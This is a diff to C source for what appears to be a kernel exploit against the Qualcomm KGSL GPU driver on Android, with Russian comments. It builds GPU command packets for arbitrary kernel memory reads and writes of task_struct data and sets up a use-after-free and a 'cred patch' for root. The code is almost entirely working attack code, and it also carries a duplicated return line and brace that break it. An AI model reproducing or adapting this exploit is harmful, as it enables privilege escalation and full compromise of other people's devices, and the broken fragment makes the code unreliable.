@@ -90,6 +90,50 @@ uint64_t g_uaf_mmapsize = 0;
 void *g_uaf_mmap_ptr = NULL;
 uint64_t g_shellcode_va = 0;
 
+static unsigned g_persistent_ctx_id = 0;
+static unsigned g_persistent_ib_id = 0;
+static void *g_persistent_ib_vma = NULL;
+static uint64_t g_persistent_ib_gpu = 0;
+static unsigned g_persistent_dst_id = 0;
+static void *g_persistent_dst_vma = NULL;
+static uint64_t g_persistent_dst_gpu = 0;
+
+static int setup_gpu_persistent(int fd) {
+    if (fd < 0) return -1;
+    if (g_persistent_ctx_id != 0) return 0;
+    
+    struct kgsl_drawctxt_create ctx = {.flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
+    int retry = 30; // Больше попыток
+    while (retry--) {
+        if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) == 0) {
+            g_persistent_ctx_id = ctx.drawctxt_id;
+            break;
+        }
+        if (retry % 5 == 0) fprintf(stderr, "[GPU] Waiting for context slot... (%d left)\n", retry);
+        usleep(300000); // 300ms
+    }
+    if (g_persistent_ctx_id == 0) return -1;
+
+    struct kgsl_gpuobj_alloc ib_alloc = {.size = PAGE_SIZE * 8, .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
+    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0) return -1;
+    g_persistent_ib_id = ib_alloc.id;
+    g_persistent_ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)g_persistent_ib_id) << 12);
+    
+    struct kgsl_gpuobj_info info = {.id = g_persistent_ib_id};
+    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
+    g_persistent_ib_gpu = info.gpuaddr;
+
+    struct kgsl_gpuobj_alloc dst_alloc = {.size = PAGE_SIZE * 2, .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
+    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0) return -1;
+    g_persistent_dst_id = dst_alloc.id;
+    g_persistent_dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)g_persistent_dst_id) << 12);
+    info.id = g_persistent_dst_id;
+    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
+    g_persistent_dst_gpu = info.gpuaddr;
+
+    return 0;
+}
+
 static void flush_icache(void *addr, size_t len)
 {
     __builtin___clear_cache((char *)addr, (char *)addr + len);
@@ -786,92 +830,22 @@ cleanup:
 
 static int gpu_read_task_struct(int fd, uint64_t task_va, uint8_t *buffer, size_t size)
 {
-    if (fd < 0)
-    {
-        fprintf(stderr, "[GPU_READ] Invalid fd: %d\n", fd);
-        return -1;
-    }
+    if (setup_gpu_persistent(fd) != 0) return -1;
 
-    if (size > 4096)
-    {
-        fprintf(stderr, "[GPU_READ] Size too large: %zu, limiting to 4096\n", size);
-        size = 4096;
-    }
+    if (size > 4096) size = 4096;
 
-    unsigned ctx_id = 0, ib_id = 0, dst_id = 0;
-    uint64_t ib_gpu = 0, dst_gpu = 0;
-    void *ib_vma = NULL, *dst_vma = NULL;
-    int result = -1;
-
-    struct kgsl_drawctxt_create ctx = {
-        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
-    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
-    {
-        fprintf(stderr, "[GPU_READ] Failed to create context\n");
-        return -1;
-    }
-    ctx_id = ctx.drawctxt_id;
-
-    struct kgsl_gpuobj_alloc ib_alloc = {
-        .size = PAGE_SIZE * 8,
-        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
-    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
-    {
-        fprintf(stderr, "[GPU_READ] IB alloc failed\n");
-        goto cleanup;
-    }
-    ib_id = ib_alloc.id;
-    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
-                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
-    if (ib_vma == MAP_FAILED)
-    {
-        fprintf(stderr, "[GPU_READ] IB mmap failed\n");
-        goto cleanup;
-    }
-
-    struct kgsl_gpuobj_info info = {.id = ib_id};
-    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
-    ib_gpu = info.gpuaddr;
-
-    struct kgsl_gpuobj_alloc dst_alloc = {
-        .size = PAGE_SIZE,
-        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
-    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0)
-    {
-        fprintf(stderr, "[GPU_READ] DST alloc failed\n");
-        goto cleanup;
-    }
-    dst_id = dst_alloc.id;
-    dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
-                   MAP_SHARED, fd, ((off_t)dst_id) << 12);
-    if (dst_vma == MAP_FAILED)
-    {
-        fprintf(stderr, "[GPU_READ] DST mmap failed\n");
-        goto cleanup;
-    }
-
-    info.id = dst_id;
-    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
-    dst_gpu = info.gpuaddr;
-
-    uint32_t *cmd = (uint32_t *)ib_vma;
+    uint32_t *cmd = (uint32_t *)g_persistent_ib_vma;
     int dw = 0;
-    memset(ib_vma, 0, ib_alloc.mmapsize);
-    memset(dst_vma, 0, dst_alloc.mmapsize);
+    memset(g_persistent_ib_vma, 0, PAGE_SIZE * 8);
+    memset(g_persistent_dst_vma, 0, PAGE_SIZE * 2);
 
     cmd[dw++] = cp_type7_packet(CP_NOP, 0);
 
     int dwords = size / 4;
-    if (dwords > 1024)
-    {
-        fprintf(stderr, "[GPU_READ] Too many dwords: %d, limiting to 1024\n", dwords);
-        dwords = 1024;
-    }
-
     for (int i = 0; i < dwords; i++)
     {
         uint32_t d_lo, d_hi, s_lo, s_hi;
-        split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
+        split64(g_persistent_dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
         split64(task_va + (uint64_t)i * 4, &s_lo, &s_hi);
         cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
         cmd[dw++] = 0;
@@ -880,174 +854,85 @@ static int gpu_read_task_struct(int fd, uint64_t task_va, uint8_t *buffer, size_
         cmd[dw++] = s_lo;
         cmd[dw++] = s_hi;
     }
-
     cmd[dw++] = cp_type7_packet(CP_NOP, 0);
 
     size_t ib_bytes = (size_t)dw * 4;
-    msync(ib_vma, ib_bytes, MS_SYNC);
+    msync(g_persistent_ib_vma, ib_bytes, MS_SYNC);
 
     struct kgsl_command_object obj = {
-        .gpuaddr = ib_gpu,
+        .gpuaddr = g_persistent_ib_gpu,
         .size = ib_bytes,
         .flags = KGSL_CMDLIST_IB,
-        .id = ib_id};
+        .id = g_persistent_ib_id};
 
     struct kgsl_gpu_command gpu_cmd = {0};
     gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
     gpu_cmd.cmdsize = sizeof(obj);
     gpu_cmd.numcmds = 1;
-    gpu_cmd.context_id = ctx_id;
+    gpu_cmd.context_id = g_persistent_ctx_id;
 
     if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
-        wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0)
+        wait_timestamp(fd, g_persistent_ctx_id, gpu_cmd.timestamp) == 0)
     {
-        msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);
-        memcpy(buffer, dst_vma, size);
-        result = 0;
-        // Quiet mode
+        msync(g_persistent_dst_vma, PAGE_SIZE, MS_SYNC | MS_INVALIDATE);
+        memcpy(buffer, g_persistent_dst_vma, size);
+        return 0;
     }
-    else
-    {
-        fprintf(stderr, "[GPU_READ] GPU command failed for 0x%lx\n", (unsigned long)task_va);
-    }
-
-cleanup:
-    if (dst_vma && dst_vma != MAP_FAILED)
-        munmap(dst_vma, dst_alloc.mmapsize);
-    if (ib_vma && ib_vma != MAP_FAILED)
-        munmap(ib_vma, ib_alloc.mmapsize);
-    if (dst_id)
-    {
-        struct kgsl_gpuobj_free fr = {0};
-        fr.id = dst_id;
-        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
-    }
-    if (ib_id)
-    {
-        struct kgsl_gpuobj_free fr = {0};
-        fr.id = ib_id;
-        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
-    }
-
-    if (ctx_id)
-    {
-        struct kgsl_drawctxt_destroy dctx;
-        dctx.drawctxt_id = ctx_id;
-        ioctl(fd, _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy), &dctx);
-    }
-
-    return result;
+    return -1;
 }
 
 static int gpu_write_task_virt(int fd, uint64_t dst_va, uint8_t *buffer, size_t size)
 {
-    if (fd < 0)
-        return -1;
+    if (setup_gpu_persistent(fd) != 0) return -1;
 
-    if (size > 4096)
-        size = 4096;
+    if (size > 4096) size = 4096;
 
-    unsigned ctx_id = 0, ib_id = 0;
-    uint64_t ib_gpu = 0;
-    void *ib_vma = NULL;
-    int result = -1;
-
-    struct kgsl_drawctxt_create ctx = {.flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
-    
-    int retry = 10;
-    while (retry--) {
-        if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) == 0) {
-            ctx_id = ctx.drawctxt_id;
-            break;
-        }
-        if (retry > 0) {
-            usleep(200000); // 200ms
-        }
-    }
-    
-    if (ctx_id == 0) {
-        fprintf(stderr, "[GPU_WRITE] Failed to create context after 10 retries\n");
-        return -1;
-    }
-
-    struct kgsl_gpuobj_alloc ib_alloc = {.size = PAGE_SIZE * 4, .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
-    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
-        goto cleanup;
-    ib_id = ib_alloc.id;
-    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)ib_id) << 12);
-    if (ib_vma == MAP_FAILED)
-        goto cleanup;
-
-    struct kgsl_gpuobj_info info = {.id = ib_id};
-    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
-    ib_gpu = info.gpuaddr;
-
-    uint32_t *cmd = (uint32_t *)ib_vma;
+    uint32_t *cmd = (uint32_t *)g_persistent_ib_vma;
     int dw = 0;
-    memset(ib_vma, 0, ib_alloc.mmapsize);
+    memset(g_persistent_ib_vma, 0, PAGE_SIZE * 8);
 
     cmd[dw++] = cp_type7_packet(CP_NOP, 0);
 
-    int dwords = (size + 3) / 4;
-    if (dwords > 256)
-        dwords = 256;
-
-    for (int i = 0; i < dwords; i++)
-    {
-        uint32_t val = 0;
+    int dwords = size / 4;
+    for (int i = 0; i < dwords; i++) {
         uint32_t d_lo, d_hi;
-        if (i * 4 < size)
-            memcpy(&val, buffer + i * 4, sizeof(val));
         split64(dst_va + (uint64_t)i * 4, &d_lo, &d_hi);
         cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
         cmd[dw++] = d_lo;
         cmd[dw++] = d_hi;
-        cmd[dw++] = val;
+        cmd[dw++] = *(uint32_t *)(buffer + i * 4);
     }
-
     cmd[dw++] = cp_type7_packet(CP_NOP, 0);
 
     size_t ib_bytes = (size_t)dw * 4;
-    msync(ib_vma, ib_bytes, MS_SYNC);
+    msync(g_persistent_ib_vma, ib_bytes, MS_SYNC);
 
-    struct kgsl_command_object obj = {.gpuaddr = ib_gpu, .size = ib_bytes, .flags = KGSL_CMDLIST_IB, .id = ib_id};
+    struct kgsl_command_object obj = {
+        .gpuaddr = g_persistent_ib_gpu,
+        .size = ib_bytes,
+        .flags = KGSL_CMDLIST_IB,
+        .id = g_persistent_ib_id};
+
     struct kgsl_gpu_command gpu_cmd = {0};
     gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
     gpu_cmd.cmdsize = sizeof(obj);
     gpu_cmd.numcmds = 1;
-    gpu_cmd.context_id = ctx_id;
+    gpu_cmd.context_id = g_persistent_ctx_id;
 
-    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 && wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0)
+    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
+        wait_timestamp(fd, g_persistent_ctx_id, gpu_cmd.timestamp) == 0)
     {
-        __sync_synchronize();
-        usleep(100000);
-        result = 0;
-        fprintf(stderr, "[GPU_WRITE] CP_MEM_WRITE submitted OK for 0x%lx\n", (unsigned long)dst_va);
+        return 0;
     }
-
-cleanup:
-    if (ib_vma && ib_vma != MAP_FAILED)
-        munmap(ib_vma, ib_alloc.mmapsize);
-    if (ib_id)
-    {
-        struct kgsl_gpuobj_free fr = {0};
-        fr.id = ib_id;
-        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
-    }
-    if (ctx_id)
-    {
-        struct kgsl_drawctxt_destroy dctx;
-        dctx.drawctxt_id = ctx_id;
-        ioctl(fd, _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy), &dctx);
-    }
-
-    return result;
+    return -1;
 }
 
 static int gpu_write_task_u32(int fd, uint64_t dst_va, uint32_t value)
 {
     uint8_t buf[4];
     memcpy(buf, &value, 4);
+    return gpu_write_task_virt(fd, dst_va, buf, 4);
+}
     return gpu_write_task_virt(fd, dst_va, buf, 4);
 }
 
@@ -2802,8 +2687,17 @@ restart:;
     
     fprintf(stderr, "[+] Triggering cred patch in target process %d...\n", target_pid);
     
-    // Закрываем GPU FD в родителе, чтобы освободить ресурсы для ребенка
+    // Освобождаем ВСЕ ресурсы GPU в родителе перед активацией ребенка
     if (fd > 0) {
+        if (g_uaf_mmap_ptr) {
+            munmap(g_uaf_mmap_ptr, g_uaf_mmapsize);
+            g_uaf_mmap_ptr = NULL;
+        }
+        if (g_uaf_id > 0) {
+            struct kgsl_gpuobj_free fr = {.id = g_uaf_id};
+            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
+            g_uaf_id = 0;
+        }
         close(fd);
         fd = -1;
     }
